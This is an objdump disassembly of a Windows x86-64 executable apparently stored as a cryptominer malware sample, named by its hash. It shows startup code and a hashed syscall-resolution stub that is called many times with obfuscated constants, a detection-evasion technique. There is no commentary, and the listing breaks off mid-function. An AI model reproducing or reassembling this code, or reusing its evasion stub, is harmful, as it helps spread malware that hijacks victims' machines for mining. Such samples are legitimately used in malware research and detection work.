
malware_samples/miner/dc989a538c40901f56be9b9f58f5e03cf3223dd47edcfd425c65b27652a429cc.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	56                   	push   %rsi
   140001001:	48 83 ec 20          	sub    $0x20,%rsp
   140001005:	48 8b 05 1c 30 01 00 	mov    0x1301c(%rip),%rax        # 0x140014028
   14000100c:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001012:	48 8b 05 17 30 01 00 	mov    0x13017(%rip),%rax        # 0x140014030
   140001019:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000101f:	48 8b 05 12 30 01 00 	mov    0x13012(%rip),%rax        # 0x140014038
   140001026:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000102c:	48 8b 0d d5 2f 01 00 	mov    0x12fd5(%rip),%rcx        # 0x140014008
   140001033:	0f b7 11             	movzwl (%rcx),%edx
   140001036:	31 c0                	xor    %eax,%eax
   140001038:	81 fa 4d 5a 00 00    	cmp    $0x5a4d,%edx
   14000103e:	75 4b                	jne    0x14000108b
   140001040:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140001044:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   14000104b:	75 3e                	jne    0x14000108b
   14000104d:	48 01 d1             	add    %rdx,%rcx
   140001050:	0f b7 51 18          	movzwl 0x18(%rcx),%edx
   140001054:	81 fa 0b 02 00 00    	cmp    $0x20b,%edx
   14000105a:	74 17                	je     0x140001073
   14000105c:	81 fa 0b 01 00 00    	cmp    $0x10b,%edx
   140001062:	75 27                	jne    0x14000108b
   140001064:	83 79 74 0f          	cmpl   $0xf,0x74(%rcx)
   140001068:	72 21                	jb     0x14000108b
   14000106a:	48 81 c1 e8 00 00 00 	add    $0xe8,%rcx
   140001071:	eb 10                	jmp    0x140001083
   140001073:	83 b9 84 00 00 00 0f 	cmpl   $0xf,0x84(%rcx)
   14000107a:	72 0f                	jb     0x14000108b
   14000107c:	48 81 c1 f8 00 00 00 	add    $0xf8,%rcx
   140001083:	31 c0                	xor    %eax,%eax
   140001085:	83 39 00             	cmpl   $0x0,(%rcx)
   140001088:	0f 95 c0             	setne  %al
   14000108b:	48 8b 0d 8e 2f 01 00 	mov    0x12f8e(%rip),%rcx        # 0x140014020
   140001092:	83 39 01             	cmpl   $0x1,(%rcx)
   140001095:	89 05 a9 cb 50 00    	mov    %eax,0x50cba9(%rip)        # 0x14050dc44
   14000109b:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400010a0:	83 d9 00             	sbb    $0x0,%ecx
   1400010a3:	e8 18 1e 01 00       	call   0x140012ec0
   1400010a8:	48 8b 05 d9 2f 01 00 	mov    0x12fd9(%rip),%rax        # 0x140014088
   1400010af:	8b 30                	mov    (%rax),%esi
   1400010b1:	e8 0a 0f 00 00       	call   0x140001fc0
   1400010b6:	89 30                	mov    %esi,(%rax)
   1400010b8:	48 8b 05 b9 2f 01 00 	mov    0x12fb9(%rip),%rax        # 0x140014078
   1400010bf:	8b 30                	mov    (%rax),%esi
   1400010c1:	e8 ea 0e 00 00       	call   0x140001fb0
   1400010c6:	89 30                	mov    %esi,(%rax)
   1400010c8:	e8 83 06 00 00       	call   0x140001750
   1400010cd:	48 8b 05 2c 2f 01 00 	mov    0x12f2c(%rip),%rax        # 0x140014000
   1400010d4:	83 38 01             	cmpl   $0x1,(%rax)
   1400010d7:	75 0c                	jne    0x1400010e5
   1400010d9:	48 8d 0d 20 07 00 00 	lea    0x720(%rip),%rcx        # 0x140001800
   1400010e0:	e8 1b 0d 00 00       	call   0x140001e00
   1400010e5:	31 c0                	xor    %eax,%eax
   1400010e7:	48 83 c4 20          	add    $0x20,%rsp
   1400010eb:	5e                   	pop    %rsi
   1400010ec:	c3                   	ret
   1400010ed:	0f 1f 00             	nopl   (%rax)
   1400010f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400010f4:	48 8b 05 95 2f 01 00 	mov    0x12f95(%rip),%rax        # 0x140014090
   1400010fb:	8b 00                	mov    (%rax),%eax
   1400010fd:	89 05 45 cb 50 00    	mov    %eax,0x50cb45(%rip)        # 0x14050dc48
   140001103:	48 8d 05 3e cb 50 00 	lea    0x50cb3e(%rip),%rax        # 0x14050dc48
   14000110a:	48 8b 0d 6f 2f 01 00 	mov    0x12f6f(%rip),%rcx        # 0x140014080
   140001111:	44 8b 09             	mov    (%rcx),%r9d
   140001114:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001119:	48 8d 0d 2c cb 50 00 	lea    0x50cb2c(%rip),%rcx        # 0x14050dc4c
   140001120:	48 8d 15 29 cb 50 00 	lea    0x50cb29(%rip),%rdx        # 0x14050dc50
   140001127:	4c 8d 05 2a cb 50 00 	lea    0x50cb2a(%rip),%r8        # 0x14050dc58
   14000112e:	e8 7d 1d 01 00       	call   0x140012eb0
   140001133:	90                   	nop
   140001134:	48 83 c4 28          	add    $0x28,%rsp
   140001138:	c3                   	ret
   140001139:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001140:	48 83 ec 28          	sub    $0x28,%rsp
   140001144:	48 8b 05 d5 2e 01 00 	mov    0x12ed5(%rip),%rax        # 0x140014020
   14000114b:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001151:	e8 0a 00 00 00       	call   0x140001160
   140001156:	90                   	nop
   140001157:	90                   	nop
   140001158:	90                   	nop
   140001159:	48 83 c4 28          	add    $0x28,%rsp
   14000115d:	c3                   	ret
   14000115e:	66 90                	xchg   %ax,%ax
   140001160:	41 57                	push   %r15
   140001162:	41 56                	push   %r14
   140001164:	56                   	push   %rsi
   140001165:	57                   	push   %rdi
   140001166:	53                   	push   %rbx
   140001167:	48 83 ec 20          	sub    $0x20,%rsp
   14000116b:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001172:	00 00 
   140001174:	48 8b 78 08          	mov    0x8(%rax),%rdi
   140001178:	48 8b 35 c9 2e 01 00 	mov    0x12ec9(%rip),%rsi        # 0x140014048
   14000117f:	31 c0                	xor    %eax,%eax
   140001181:	f0 48 0f b1 3e       	lock cmpxchg %rdi,(%rsi)
   140001186:	0f 94 c3             	sete   %bl
   140001189:	74 2e                	je     0x1400011b9
   14000118b:	48 39 c7             	cmp    %rax,%rdi
   14000118e:	74 29                	je     0x1400011b9
   140001190:	4c 8b 35 49 66 01 00 	mov    0x16649(%rip),%r14        # 0x1400177e0
   140001197:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000119e:	00 00 
   1400011a0:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011a5:	41 ff d6             	call   *%r14
   1400011a8:	31 c0                	xor    %eax,%eax
   1400011aa:	f0 48 0f b1 3e       	lock cmpxchg %rdi,(%rsi)
   1400011af:	0f 94 c3             	sete   %bl
   1400011b2:	74 05                	je     0x1400011b9
   1400011b4:	48 39 c7             	cmp    %rax,%rdi
   1400011b7:	75 e7                	jne    0x1400011a0
   1400011b9:	48 8b 3d 90 2e 01 00 	mov    0x12e90(%rip),%rdi        # 0x140014050
   1400011c0:	8b 07                	mov    (%rdi),%eax
   1400011c2:	83 f8 01             	cmp    $0x1,%eax
   1400011c5:	75 0c                	jne    0x1400011d3
   1400011c7:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   1400011cc:	e8 ff 1c 01 00       	call   0x140012ed0
   1400011d1:	eb 27                	jmp    0x1400011fa
   1400011d3:	83 3f 00             	cmpl   $0x0,(%rdi)
   1400011d6:	74 09                	je     0x1400011e1
   1400011d8:	c6 05 81 ca 50 00 01 	movb   $0x1,0x50ca81(%rip)        # 0x14050dc60
   1400011df:	eb 19                	jmp    0x1400011fa
   1400011e1:	c7 07 01 00 00 00    	movl   $0x1,(%rdi)
   1400011e7:	48 8b 0d 7a 2e 01 00 	mov    0x12e7a(%rip),%rcx        # 0x140014068
   1400011ee:	48 8b 15 7b 2e 01 00 	mov    0x12e7b(%rip),%rdx        # 0x140014070
   1400011f5:	e8 f6 1c 01 00       	call   0x140012ef0
   1400011fa:	8b 07                	mov    (%rdi),%eax
   1400011fc:	83 f8 01             	cmp    $0x1,%eax
   1400011ff:	75 19                	jne    0x14000121a
   140001201:	48 8b 0d 50 2e 01 00 	mov    0x12e50(%rip),%rcx        # 0x140014058
   140001208:	48 8b 15 51 2e 01 00 	mov    0x12e51(%rip),%rdx        # 0x140014060
   14000120f:	e8 dc 1c 01 00       	call   0x140012ef0
   140001214:	c7 07 02 00 00 00    	movl   $0x2,(%rdi)
   14000121a:	84 db                	test   %bl,%bl
   14000121c:	74 05                	je     0x140001223
   14000121e:	31 c0                	xor    %eax,%eax
   140001220:	48 87 06             	xchg   %rax,(%rsi)
   140001223:	48 8b 05 e6 2d 01 00 	mov    0x12de6(%rip),%rax        # 0x140014010
   14000122a:	48 8b 00             	mov    (%rax),%rax
   14000122d:	48 85 c0             	test   %rax,%rax
   140001230:	74 10                	je     0x140001242
   140001232:	31 c9                	xor    %ecx,%ecx
   140001234:	ba 02 00 00 00       	mov    $0x2,%edx
   140001239:	45 31 c0             	xor    %r8d,%r8d
   14000123c:	ff 15 c6 0d 51 00    	call   *0x510dc6(%rip)        # 0x140512008
   140001242:	e8 39 06 00 00       	call   0x140001880
   140001247:	48 8d 0d c2 0b 00 00 	lea    0xbc2(%rip),%rcx        # 0x140001e10
   14000124e:	ff 15 84 65 01 00    	call   *0x16584(%rip)        # 0x1400177d8
   140001254:	48 8b 0d e5 2d 01 00 	mov    0x12de5(%rip),%rcx        # 0x140014040
   14000125b:	48 89 01             	mov    %rax,(%rcx)
   14000125e:	48 8d 0d 2b 01 00 00 	lea    0x12b(%rip),%rcx        # 0x140001390
   140001265:	e8 26 0d 00 00       	call   0x140001f90
   14000126a:	e8 01 06 00 00       	call   0x140001870
   14000126f:	48 63 3d d6 c9 50 00 	movslq 0x50c9d6(%rip),%rdi        # 0x14050dc4c
   140001276:	48 8d 0c fd 08 00 00 	lea    0x8(,%rdi,8),%rcx
   14000127d:	00 
   14000127e:	e8 9d 1c 01 00       	call   0x140012f20
   140001283:	48 89 c6             	mov    %rax,%rsi
   140001286:	48 85 ff             	test   %rdi,%rdi
   140001289:	7e 47                	jle    0x1400012d2
   14000128b:	89 fb                	mov    %edi,%ebx
   14000128d:	4c 8b 35 bc c9 50 00 	mov    0x50c9bc(%rip),%r14        # 0x14050dc50
   140001294:	45 31 ff             	xor    %r15d,%r15d
   140001297:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000129e:	00 00 
   1400012a0:	4b 8b 0c fe          	mov    (%r14,%r15,8),%rcx
   1400012a4:	e8 b7 1c 01 00       	call   0x140012f60
   1400012a9:	48 8d 78 01          	lea    0x1(%rax),%rdi
   1400012ad:	48 89 f9             	mov    %rdi,%rcx
   1400012b0:	e8 6b 1c 01 00       	call   0x140012f20
   1400012b5:	4a 89 04 fe          	mov    %rax,(%rsi,%r15,8)
   1400012b9:	4b 8b 14 fe          	mov    (%r14,%r15,8),%rdx
   1400012bd:	48 89 c1             	mov    %rax,%rcx
   1400012c0:	49 89 f8             	mov    %rdi,%r8
   1400012c3:	e8 68 1c 01 00       	call   0x140012f30
   1400012c8:	49 ff c7             	inc    %r15
   1400012cb:	4c 39 fb             	cmp    %r15,%rbx
   1400012ce:	75 d0                	jne    0x1400012a0
   1400012d0:	eb 02                	jmp    0x1400012d4
   1400012d2:	31 db                	xor    %ebx,%ebx
   1400012d4:	48 c7 04 de 00 00 00 	movq   $0x0,(%rsi,%rbx,8)
   1400012db:	00 
   1400012dc:	48 89 35 6d c9 50 00 	mov    %rsi,0x50c96d(%rip)        # 0x14050dc50
   1400012e3:	e8 d8 03 00 00       	call   0x1400016c0
   1400012e8:	48 8b 05 69 c9 50 00 	mov    0x50c969(%rip),%rax        # 0x14050dc58
   1400012ef:	48 8b 0d 22 2d 01 00 	mov    0x12d22(%rip),%rcx        # 0x140014018
   1400012f6:	48 8b 09             	mov    (%rcx),%rcx
   1400012f9:	48 89 01             	mov    %rax,(%rcx)
   1400012fc:	8b 0d 4a c9 50 00    	mov    0x50c94a(%rip),%ecx        # 0x14050dc4c
   140001302:	48 8b 15 47 c9 50 00 	mov    0x50c947(%rip),%rdx        # 0x14050dc50
   140001309:	4c 8b 05 48 c9 50 00 	mov    0x50c948(%rip),%r8        # 0x14050dc58
   140001310:	e8 ab 2c 00 00       	call   0x140003fc0
   140001315:	89 05 49 c9 50 00    	mov    %eax,0x50c949(%rip)        # 0x14050dc64
   14000131b:	83 3d 22 c9 50 00 00 	cmpl   $0x0,0x50c922(%rip)        # 0x14050dc44
   140001322:	74 20                	je     0x140001344
   140001324:	80 3d 35 c9 50 00 00 	cmpb   $0x0,0x50c935(%rip)        # 0x14050dc60
   14000132b:	75 0b                	jne    0x140001338
   14000132d:	e8 ae 1b 01 00       	call   0x140012ee0
   140001332:	8b 05 2c c9 50 00    	mov    0x50c92c(%rip),%eax        # 0x14050dc64
   140001338:	48 83 c4 20          	add    $0x20,%rsp
   14000133c:	5b                   	pop    %rbx
   14000133d:	5f                   	pop    %rdi
   14000133e:	5e                   	pop    %rsi
   14000133f:	41 5e                	pop    %r14
   140001341:	41 5f                	pop    %r15
   140001343:	c3                   	ret
   140001344:	89 c1                	mov    %eax,%ecx
   140001346:	e8 c5 1b 01 00       	call   0x140012f10
   14000134b:	cc                   	int3
   14000134c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001350:	48 83 ec 28          	sub    $0x28,%rsp
   140001354:	48 8b 05 c5 2c 01 00 	mov    0x12cc5(%rip),%rax        # 0x140014020
   14000135b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001361:	e8 fa fd ff ff       	call   0x140001160
   140001366:	90                   	nop
   140001367:	90                   	nop
   140001368:	90                   	nop
   140001369:	48 83 c4 28          	add    $0x28,%rsp
   14000136d:	c3                   	ret
   14000136e:	66 90                	xchg   %ax,%ax
   140001370:	48 83 ec 28          	sub    $0x28,%rsp
   140001374:	e8 87 1b 01 00       	call   0x140012f00
   140001379:	31 c9                	xor    %ecx,%ecx
   14000137b:	48 83 f8 01          	cmp    $0x1,%rax
   14000137f:	19 c9                	sbb    %ecx,%ecx
   140001381:	89 c8                	mov    %ecx,%eax
   140001383:	48 83 c4 28          	add    $0x28,%rsp
   140001387:	c3                   	ret
   140001388:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000138f:	00 
   140001390:	c3                   	ret
   140001391:	cc                   	int3
   140001392:	cc                   	int3
   140001393:	cc                   	int3
   140001394:	58                   	pop    %rax
   140001395:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000139a:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000139f:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   1400013a4:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400013a9:	48 83 ec 28          	sub    $0x28,%rsp
   1400013ad:	8b 0d 4d 6c 01 00    	mov    0x16c4d(%rip),%ecx        # 0x140018000
   1400013b3:	e8 88 16 01 00       	call   0x140012a40
   1400013b8:	89 05 4e 6c 01 00    	mov    %eax,0x16c4e(%rip)        # 0x14001800c
   1400013be:	48 31 c9             	xor    %rcx,%rcx
   1400013c1:	e8 2a 19 01 00       	call   0x140012cf0
   1400013c6:	48 89 05 43 6c 01 00 	mov    %rax,0x16c43(%rip)        # 0x140018010
   1400013cd:	48 31 c0             	xor    %rax,%rax
   1400013d0:	8b 05 36 6c 01 00    	mov    0x16c36(%rip),%eax        # 0x14001800c
   1400013d6:	48 83 c4 28          	add    $0x28,%rsp
   1400013da:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   1400013df:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   1400013e4:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   1400013e9:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   1400013ee:	49 89 ca             	mov    %rcx,%r10
   1400013f1:	8f 05 0d 6c 01 00    	pop    0x16c0d(%rip)        # 0x140018004
   1400013f7:	ff 15 13 6c 01 00    	call   *0x16c13(%rip)        # 0x140018010
   1400013fd:	ff 35 01 6c 01 00    	push   0x16c01(%rip)        # 0x140018004
   140001403:	c3                   	ret
   140001404:	c7 05 f2 6b 01 00 92 	movl   $0x2ec7c792,0x16bf2(%rip)        # 0x140018000
   14000140b:	c7 c7 2e 
   14000140e:	e8 81 ff ff ff       	call   0x140001394
   140001413:	c7 05 e3 6b 01 00 ac 	movl   $0x50d4bdac,0x16be3(%rip)        # 0x140018000
   14000141a:	bd d4 50 
   14000141d:	e8 72 ff ff ff       	call   0x140001394
   140001422:	c7 05 d4 6b 01 00 c3 	movl   $0x45d9f3c3,0x16bd4(%rip)        # 0x140018000
   140001429:	f3 d9 45 
   14000142c:	e8 63 ff ff ff       	call   0x140001394
   140001431:	c7 05 c5 6b 01 00 0b 	movl   $0x7b2e5a0b,0x16bc5(%rip)        # 0x140018000
   140001438:	5a 2e 7b 
   14000143b:	e8 54 ff ff ff       	call   0x140001394
   140001440:	c7 05 b6 6b 01 00 05 	movl   $0x7a194005,0x16bb6(%rip)        # 0x140018000
   140001447:	40 19 7a 
   14000144a:	e8 45 ff ff ff       	call   0x140001394
   14000144f:	c7 05 a7 6b 01 00 ff 	movl   $0x3877daff,0x16ba7(%rip)        # 0x140018000
   140001456:	da 77 38 
   140001459:	e8 36 ff ff ff       	call   0x140001394
   14000145e:	c7 05 98 6b 01 00 69 	movl   $0x64d67769,0x16b98(%rip)        # 0x140018000
   140001465:	77 d6 64 
   140001468:	e8 27 ff ff ff       	call   0x140001394
   14000146d:	c7 05 89 6b 01 00 55 	movl   $0x1a572e55,0x16b89(%rip)        # 0x140018000
   140001474:	2e 57 1a 
   140001477:	e8 18 ff ff ff       	call   0x140001394
   14000147c:	c7 05 7a 6b 01 00 c9 	movl   $0xc4cd6ec9,0x16b7a(%rip)        # 0x140018000
   140001483:	6e cd c4 
   140001486:	e8 09 ff ff ff       	call   0x140001394
   14000148b:	c7 05 6b 6b 01 00 bc 	movl   $0xf71bbbc,0x16b6b(%rip)        # 0x140018000
   140001492:	bb 71 0f 
   140001495:	e8 fa fe ff ff       	call   0x140001394
   14000149a:	c7 05 5c 6b 01 00 a7 	movl   $0xf43b8ba7,0x16b5c(%rip)        # 0x140018000
   1400014a1:	8b 3b f4 
   1400014a4:	e8 eb fe ff ff       	call   0x140001394
   1400014a9:	c7 05 4d 6b 01 00 02 	movl   $0x2471d702,0x16b4d(%rip)        # 0x140018000
   1400014b0:	d7 71 24 
   1400014b3:	e8 dc fe ff ff       	call   0x140001394
   1400014b8:	c7 05 3e 6b 01 00 c6 	movl   $0x6e128c6,0x16b3e(%rip)        # 0x140018000
   1400014bf:	28 e1 06 
   1400014c2:	e8 cd fe ff ff       	call   0x140001394
   1400014c7:	c7 05 2f 6b 01 00 82 	movl   $0x8458df82,0x16b2f(%rip)        # 0x140018000
   1400014ce:	df 58 84 
   1400014d1:	e8 be fe ff ff       	call   0x140001394
   1400014d6:	c7 05 20 6b 01 00 df 	movl   $0xc1db8cdf,0x16b20(%rip)        # 0x140018000
   1400014dd:	8c db c1 
   1400014e0:	e8 af fe ff ff       	call   0x140001394
   1400014e5:	c7 05 11 6b 01 00 3e 	movl   $0x49d95b3e,0x16b11(%rip)        # 0x140018000
   1400014ec:	5b d9 49 
   1400014ef:	e8 a0 fe ff ff       	call   0x140001394
   1400014f4:	c7 05 02 6b 01 00 03 	movl   $0x97d0cb03,0x16b02(%rip)        # 0x140018000
   1400014fb:	cb d0 97 
   1400014fe:	e8 91 fe ff ff       	call   0x140001394
   140001503:	c7 05 f3 6a 01 00 84 	movl   $0xa4f66884,0x16af3(%rip)        # 0x140018000
   14000150a:	68 f6 a4 
   14000150d:	e8 82 fe ff ff       	call   0x140001394
   140001512:	c7 05 e4 6a 01 00 7f 	movl   $0x72e27c7f,0x16ae4(%rip)        # 0x140018000
   140001519:	7c e2 72 
   14000151c:	e8 73 fe ff ff       	call   0x140001394
   140001521:	c7 05 d5 6a 01 00 50 	movl   $0xc10e3a50,0x16ad5(%rip)        # 0x140018000
   140001528:	3a 0e c1 
   14000152b:	e8 64 fe ff ff       	call   0x140001394
   140001530:	c7 05 c6 6a 01 00 49 	movl   $0xa1216549,0x16ac6(%rip)        # 0x140018000
   140001537:	65 21 a1 
   14000153a:	e8 55 fe ff ff       	call   0x140001394
   14000153f:	c7 05 b7 6a 01 00 af 	movl   $0x15ee14af,0x16ab7(%rip)        # 0x140018000
   140001546:	14 ee 15 
   140001549:	e8 46 fe ff ff       	call   0x140001394
   14000154e:	c7 05 a8 6a 01 00 9a 	movl   $0xb6c33a9a,0x16aa8(%rip)        # 0x140018000
   140001555:	3a c3 b6 
   140001558:	e8 37 fe ff ff       	call   0x140001394
   14000155d:	c7 05 99 6a 01 00 5e 	movl   $0x5b8e245e,0x16a99(%rip)        # 0x140018000
   140001564:	24 8e 5b 
   140001567:	e8 28 fe ff ff       	call   0x140001394
   14000156c:	c7 05 8a 6a 01 00 14 	movl   $0xdfcb9314,0x16a8a(%rip)        # 0x140018000
   140001573:	93 cb df 
   140001576:	e8 19 fe ff ff       	call   0x140001394
   14000157b:	c7 05 7b 6a 01 00 d7 	movl   $0x75fbe4d7,0x16a7b(%rip)        # 0x140018000
   140001582:	e4 fb 75 
   140001585:	e8 0a fe ff ff       	call   0x140001394
   14000158a:	c7 05 6c 6a 01 00 68 	movl   $0x10e3c268,0x16a6c(%rip)        # 0x140018000
   140001591:	c2 e3 10 
   140001594:	e8 fb fd ff ff       	call   0x140001394
   140001599:	c7 05 5d 6a 01 00 a8 	movl   $0xe50f5ba8,0x16a5d(%rip)        # 0x140018000
   1400015a0:	5b 0f e5 
   1400015a3:	e8 ec fd ff ff       	call   0x140001394
   1400015a8:	c7 05 4e 6a 01 00 19 	movl   $0x151fac19,0x16a4e(%rip)        # 0x140018000
   1400015af:	ac 1f 15 
   1400015b2:	e8 dd fd ff ff       	call   0x140001394
   1400015b7:	c7 05 3f 6a 01 00 db 	movl   $0x9eedb1db,0x16a3f(%rip)        # 0x140018000
   1400015be:	b1 ed 9e 
   1400015c1:	e8 ce fd ff ff       	call   0x140001394
   1400015c6:	c7 05 30 6a 01 00 68 	movl   $0x2e885068,0x16a30(%rip)        # 0x140018000
   1400015cd:	50 88 2e 
   1400015d0:	e8 bf fd ff ff       	call   0x140001394
   1400015d5:	c7 05 21 6a 01 00 de 	movl   $0x6f7b72de,0x16a21(%rip)        # 0x140018000
   1400015dc:	72 7b 6f 
   1400015df:	e8 b0 fd ff ff       	call   0x140001394
   1400015e4:	c7 05 12 6a 01 00 fb 	movl   $0xc9ce87fb,0x16a12(%rip)        # 0x140018000
   1400015eb:	87 ce c9 
   1400015ee:	e8 a1 fd ff ff       	call   0x140001394
   1400015f3:	cc                   	int3
   1400015f4:	cc                   	int3
   1400015f5:	cc                   	int3
   1400015f6:	cc                   	int3
   1400015f7:	cc                   	int3
   1400015f8:	cc                   	int3
   1400015f9:	cc                   	int3
   1400015fa:	cc                   	int3
   1400015fb:	cc                   	int3
   1400015fc:	cc                   	int3
   1400015fd:	cc                   	int3
   1400015fe:	cc                   	int3
   1400015ff:	cc                   	int3
   140001600:	48 83 ec 28          	sub    $0x28,%rsp
   140001604:	48 8b 05 0d 6a 01 00 	mov    0x16a0d(%rip),%rax        # 0x140018018
   14000160b:	48 8b 00             	mov    (%rax),%rax
   14000160e:	48 85 c0             	test   %rax,%rax
   140001611:	74 2e                	je     0x140001641
   140001613:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000161a:	84 00 00 00 00 00 
   140001620:	ff 15 e2 09 51 00    	call   *0x5109e2(%rip)        # 0x140512008
   140001626:	48 8b 05 eb 69 01 00 	mov    0x169eb(%rip),%rax        # 0x140018018
   14000162d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001631:	48 89 0d e0 69 01 00 	mov    %rcx,0x169e0(%rip)        # 0x140018018
   140001638:	48 8b 40 08          	mov    0x8(%rax),%rax
   14000163c:	48 85 c0             	test   %rax,%rax
   14000163f:	75 df                	jne    0x140001620
   140001641:	48 83 c4 28          	add    $0x28,%rsp
   140001645:	c3                   	ret
   140001646:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000164d:	00 00 00 
   140001650:	56                   	push   %rsi
   140001651:	57                   	push   %rdi
   140001652:	53                   	push   %rbx
   140001653:	48 83 ec 20          	sub    $0x20,%rsp
   140001657:	48 8b 35 3a 2a 01 00 	mov    0x12a3a(%rip),%rsi        # 0x140014098
   14000165e:	8b 06                	mov    (%rsi),%eax
   140001660:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001663:	75 17                	jne    0x14000167c
   140001665:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000166a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001670:	8d 48 02             	lea    0x2(%rax),%ecx
   140001673:	ff c0                	inc    %eax
   140001675:	48 83 3c ce 00       	cmpq   $0x0,(%rsi,%rcx,8)
   14000167a:	75 f4                	jne    0x140001670
   14000167c:	85 c0                	test   %eax,%eax
   14000167e:	74 25                	je     0x1400016a5
   140001680:	89 c7                	mov    %eax,%edi
   140001682:	48 ff cf             	dec    %rdi
   140001685:	48 89 fb             	mov    %rdi,%rbx
   140001688:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000168f:	00 
   140001690:	48 8b 44 fe 08       	mov    0x8(%rsi,%rdi,8),%rax
   140001695:	ff 15 6d 09 51 00    	call   *0x51096d(%rip)        # 0x140512008
   14000169b:	48 ff cb             	dec    %rbx
   14000169e:	85 ff                	test   %edi,%edi
   1400016a0:	48 89 df             	mov    %rbx,%rdi
   1400016a3:	75 eb                	jne    0x140001690
   1400016a5:	48 8d 0d 54 ff ff ff 	lea    -0xac(%rip),%rcx        # 0x140001600
   1400016ac:	48 83 c4 20          	add    $0x20,%rsp
   1400016b0:	5b                   	pop    %rbx
   1400016b1:	5f                   	pop    %rdi
   1400016b2:	5e                   	pop    %rsi
   1400016b3:	e9 b8 fc ff ff       	jmp    0x140001370
   1400016b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400016bf:	00 
   1400016c0:	56                   	push   %rsi
   1400016c1:	57                   	push   %rdi
   1400016c2:	53                   	push   %rbx
   1400016c3:	48 83 ec 20          	sub    $0x20,%rsp
   1400016c7:	80 3d 9a c5 50 00 00 	cmpb   $0x0,0x50c59a(%rip)        # 0x14050dc68
   1400016ce:	74 08                	je     0x1400016d8
   1400016d0:	48 83 c4 20          	add    $0x20,%rsp
   1400016d4:	5b                   	pop    %rbx
   1400016d5:	5f                   	pop    %rdi
   1400016d6:	5e                   	pop    %rsi
   1400016d7:	c3                   	ret
   1400016d8:	c6 05 89 c5 50 00 01 	movb   $0x1,0x50c589(%rip)        # 0x14050dc68
   1400016df:	48 8b 35 b2 29 01 00 	mov    0x129b2(%rip),%rsi        # 0x140014098
   1400016e6:	8b 06                	mov    (%rsi),%eax
   1400016e8:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400016eb:	75 1f                	jne    0x14000170c
   1400016ed:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400016f2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400016f9:	1f 84 00 00 00 00 00 
   140001700:	8d 48 02             	lea    0x2(%rax),%ecx
   140001703:	ff c0                	inc    %eax
   140001705:	48 83 3c ce 00       	cmpq   $0x0,(%rsi,%rcx,8)
   14000170a:	75 f4                	jne    0x140001700
   14000170c:	85 c0                	test   %eax,%eax
   14000170e:	74 25                	je     0x140001735
   140001710:	89 c7                	mov    %eax,%edi
   140001712:	48 ff cf             	dec    %rdi
   140001715:	48 89 fb             	mov    %rdi,%rbx
   140001718:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000171f:	00 
   140001720:	48 8b 44 fe 08       	mov    0x8(%rsi,%rdi,8),%rax
   140001725:	ff 15 dd 08 51 00    	call   *0x5108dd(%rip)        # 0x140512008
   14000172b:	48 ff cb             	dec    %rbx
   14000172e:	85 ff                	test   %edi,%edi
   140001730:	48 89 df             	mov    %rbx,%rdi
   140001733:	75 eb                	jne    0x140001720
   140001735:	48 8d 0d c4 fe ff ff 	lea    -0x13c(%rip),%rcx        # 0x140001600
   14000173c:	48 83 c4 20          	add    $0x20,%rsp
   140001740:	5b                   	pop    %rbx
   140001741:	5f                   	pop    %rdi
   140001742:	5e                   	pop    %rsi
   140001743:	e9 28 fc ff ff       	jmp    0x140001370
   140001748:	cc                   	int3
   140001749:	cc                   	int3
   14000174a:	cc                   	int3
   14000174b:	cc                   	int3
   14000174c:	cc                   	int3
   14000174d:	cc                   	int3
   14000174e:	cc                   	int3
   14000174f:	cc                   	int3
   140001750:	31 c0                	xor    %eax,%eax
   140001752:	c3                   	ret
   140001753:	cc                   	int3
   140001754:	cc                   	int3
   140001755:	cc                   	int3
   140001756:	cc                   	int3
   140001757:	cc                   	int3
   140001758:	cc                   	int3
   140001759:	cc                   	int3
   14000175a:	cc                   	int3
   14000175b:	cc                   	int3
   14000175c:	cc                   	int3
   14000175d:	cc                   	int3
   14000175e:	cc                   	int3
   14000175f:	cc                   	int3
   140001760:	56                   	push   %rsi
   140001761:	57                   	push   %rdi
   140001762:	48 83 ec 28          	sub    $0x28,%rsp
   140001766:	48 8b 05 63 29 01 00 	mov    0x12963(%rip),%rax        # 0x1400140d0
